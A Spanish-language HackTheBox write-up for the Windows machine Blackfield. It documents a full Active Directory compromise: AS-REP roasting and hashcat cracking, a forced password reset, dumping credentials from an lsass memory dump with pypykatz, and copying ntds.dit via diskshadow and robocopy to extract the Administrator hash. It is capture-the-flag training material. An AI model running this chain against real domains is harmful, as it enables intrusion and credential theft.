---
layout      : post
title       : "Blackfield - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Blackfield-HackTheBox/Blackfield.webp
category    : [ htb ]
tags        : [ Windows ]
---

En esta ocasión me he aventurado a resolver una máquina de nivel HARD Windows. Es la primera vez que me enfrento a una máquina de este calibre, me ha llevado mucho tiempo pero finalmente la he pwneado.

# Reconocimiento de Puertos

Antes de comenzar a escanear puertos, debemos saber a que sistema operativo nos enfrentamos.

A través de la herramienta WhichSystem puedo saber que me enfrento a una máquina Windows.

![](/assets/images/HTB/Blackfield-HackTheBox/whichsystem.webp)

Escaneamos puertos con nmap como de costumbre

```nmap
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
```

Tenemos un listado amplio de puertos, de los cuales procedo a obtener más información con un escaneo de servicios y versiones.

```nmap
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-27 07:59:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-27T07:59:20
|_  start_date: N/A
```

> Dominio: BLACKFIELD.local

A continuación procedo a emumerar el AD.


# Explotación

A través de rpcclient usando una null session intento enumerar usuarios.

![](/assets/images/HTB/Blackfield-HackTheBox/rpcclient1.webp)

Pero no es posible ya que no tengo credenciales de ningún usuario del dominio.

A continuación procedo a enumerar el protocolo SMB

![](/assets/images/HTB/Blackfield-HackTheBox/smbmap.webp)

Enumero los recursos existentes y veo que tengo permisos de lectura en dos de ellos, pero el que más destaca es profiles$

Asique voy a echarle un ojo.

![](/assets/images/HTB/Blackfield-HackTheBox/smbclient.webp)

Encuentro una lista grande de usuarios, asique eso me da que pensar... Podría comprobar si alguno de los usuarios es vulnerable a ASREPRoast y obtener su credencial en forma de hash para su posterior craqueo.

Paso los nombres de usuario a un archivo y lanzo el ataque ASREPRoast

> `impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/`

Y abro el archivo que se me genera y encuentro un hash del usuario `support`

![](/assets/images/HTB/Blackfield-HackTheBox/hash.webp)

A continuación voy a craquearlo usando hascat

> `hashcat -m 18200 hashes.hash /usr/share/wordlists/rockyou.txt --force`

![](/assets/images/HTB/Blackfield-HackTheBox/hash-cracked.webp)

Listo, tenemos un usuario y una contraseña.

> `support:#00^BlackKnight`

Ahora que ya tengo credenciales vuelvo para atrás de nuevo para enumerar usuarios del Dominio pero a través de la herramienta enum4linux.

Encuentro varios usuarios nuevos.

![](/assets/images/HTB/Blackfield-HackTheBox/usuarios.webp)

Hay uno que me llama la atención, el usuario audit2020, ya que había uno de los recursos compartidos de SMB llamado forensic, al cual no tenía acceso pero igual ahora que tenemos este usuario nuevo podríamos obtener sus credenciales y conseguir acceso al recurso.

Además del usuario audit seguí enumerando a través de la herramienta ldap search y encontré el nombre del DC (Domain Controller)

```ldapsearch
ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > ldapsearch

# DC01, Domain Controllers, BLACKFIELD.local
dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
cn: DC01
distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
name: DC01
sAMAccountName: DC01$
serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
dNSHostName: DC01.BLACKFIELD.local
```

En este punto estoy algo perdido... ya que solo tengo un usuario, asique me decido a lanzar bloodhound para ver que puedo hacer.

`python bloodhound.py -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192`

Se generan varios archivos de extensión .json que analizaré a continuación.


![](/assets/images/HTB/Blackfield-HackTheBox/Bloodhound1.webp)

![](/assets/images/HTB/Blackfield-HackTheBox/Bloodhound2.webp)

Como dice BloodHound puedo cambiar la contraseña del usuario audit2020 sin saber la actual, por lo tanto de esa forma ya tendríamos credenciales válidas.

A través de rpcclient es posible cambiar la contraseña.

![](/assets/images/HTB/Blackfield-HackTheBox/rpcclient2.webp)

> audit2020:elc4br4!!!

Ahora que ya tenemos credenciales voy a probarlas com cme para ver si son válidas en SMB.

```cme
❯ crackmapexec smb 10.10.10.192 -u audit2020 -p 'elc4br4!!!'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:elc4br4!!! 
```

Son válidas con SMB, ¿pero y con WinRM?

```cme
❯ crackmapexec winrm 10.10.10.192 -u audit2020 -p 'elc4br4!!!'
WINRM       10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\audit2020:elc4br4!!!
```
En esta ocasión no hubo suerte con Winrm

Pero recordemos que tenemos el recurso forensic en SMB y ya podemos acceder con las credenciales anteriores.

```smb
❯ smbclient -U "audit2020" //10.10.10.192/forensic
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

		5102079 blocks of size 4096. 1660717 blocks available
```

En la ruta commands_output encuentro varios archivos.

```smb
smb: \commands_output\> ls
  .                                   D        0  Sun Feb 23 19:14:37 2020
  ..                                  D        0  Sun Feb 23 19:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 14:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 13:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 23:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 13:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 13:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 13:51:01 2020
  route.txt                           A     3976  Sun Feb 23 13:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 13:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 13:54:29 2020

		5102079 blocks of size 4096. 1667267 blocks available
```

Miro todos los archivos y en el archivo `domain_admins.txt` enceuntro un usuario más administrador del dominio.

![](/assets/images/HTB/Blackfield-HackTheBox/doamin_admins.webp)

> Ipwn3dYourCompany

Sigo buscando y en la carpeta memory_analysis encuentro esto

```smb
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 22:28:33 2020
  ..                                  D        0  Thu May 28 22:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
  ServerManager.zip                   A 13198331  Thu May 28 22:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 22:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 22:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 22:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020

		5102079 blocks of size 4096. 1682559 blocks available
```

> Son archivos zip de un dumpeo de memoria.

Pero el que más me llama la atencion es el lsas.zip, lsas es el Servicio de Subsistema de Autoridad de Seguridad Local.

Lo descargo ya que en el mismo podríamos encontrar credenciales 

```bash
❯ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
```
Es un archivo Mini DuMP, en este caso lo analizaríamos con Mimikatz ya que es capaz de sacar credenciales de la memoria, pero solo está disponible en Windows asique busqué una alternativa y encontré pypykatz.

`pip3 install pypykatz`

`❯ pypykatz lsa minidump lsass.DMP`

Me reporta mucha información, entre ella el hash del usuario svc_backup con el que compruebo si puedo acceder al sistema a través de Winrm.

![](/assets/images/HTB/Blackfield-HackTheBox/svc_backup.webp)

![](/assets/images/HTB/Blackfield-HackTheBox/crackmapexec.webp)

Ahora ya puedo conectarme al sistema a través de WinRM

![](/assets/images/HTB/Blackfield-HackTheBox/svc.webp)

Y podemos leer la flag user.txt


# Escalada de Privilegios

Para la escalada lo primero que hago es enumerar privilegios del usuario

![](/assets/images/HTB/Blackfield-HackTheBox/privs.webp)

Busco algo de información sobre aquellos privilegios que tiene el usuario svc_backup y encuentro el siguiente recurso

[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

En el artículo encontramos 2 métodos, yo relizaré el método 1.

> Creamos un archivo con extensión.dsh con el siguiente contenido.

![](/assets/images/HTB/Blackfield-HackTheBox/elc4br4dsh.webp)

> Ejecutamos el comando `unix2dos raj.dsh` para convertir el archivo a formato DOS

Dentro de la sesión Winrm ejecutamos estos comandos.

Subimos el archivo elc4br4.dsh

```winrm
*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload /home/elc4br4/HTB/Blackfield/elc4br4.dsh
Info: Uploading /home/elc4br4/HTB/Blackfield/elc4br4.dsh to C:\Users\Administrator\Desktop\elc4br4.dsh

                                                             
Data: 112 bytes of 112 bytes copied

Info: Upload successful!
```

Una vez subido ejecutamos estos comandos:

```winrm
*Evil-WinRM* PS C:\ProgramData> diskshadow /s elc4br4.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/27/2022 1:01:36 PM

-> set context persistent nowriters
-> add volume c: alias raj
-> create
Alias raj for shadow ID {e11c7a09-e980-49d8-9e30-e8f4ed101d3c} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {6be231cf-7fa4-41ee-9ca8-b8d278040097} set as environment variable.

Querying all shadow copies with the shadow copy set ID {6be231cf-7fa4-41ee-9ca8-b8d278040097}

	* Shadow copy ID = {e11c7a09-e980-49d8-9e30-e8f4ed101d3c}		%raj%
		- Shadow copy set: {6be231cf-7fa4-41ee-9ca8-b8d278040097}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 9/27/2022 1:01:37 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %raj% z:
-> %raj% = {e11c7a09-e980-49d8-9e30-e8f4ed101d3c}
The  drive letter is already in use.
```

```winrm
*Evil-WinRM* PS C:\ProgramData> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, September 27, 2022 1:04:39 PM
   Source : z:\windows\ntds\
     Dest : C:\ProgramData\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	z:\windows\ntds\

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         0         1         0         0         0
   Bytes :   18.00 m         0   18.00 m         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Tuesday, September 27, 2022 1:04:39 PM
```

```winrm
reg save hklm\system C:\ProgramData\system
```
Y se nos copiará en el directorio un archivo llamado system.

A continuación descargamos el archivo system y ntds.dit con el comando download.

Una vez descargado podemos realizar el volcado de hashes de todos los usuarios del sistema, gracias a los archivos system y ntds.dit

> A través de impacket-secretsdump.py

![](/assets/images/HTB/Blackfield-HackTheBox/hashes.webp)

Ahora ya tenemos el hash del usuario administrador.

> `Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::`

Y ya podemos loguearnos como administrador a través de winrm.

![](/assets/images/HTB/Blackfield-HackTheBox/root.webp)


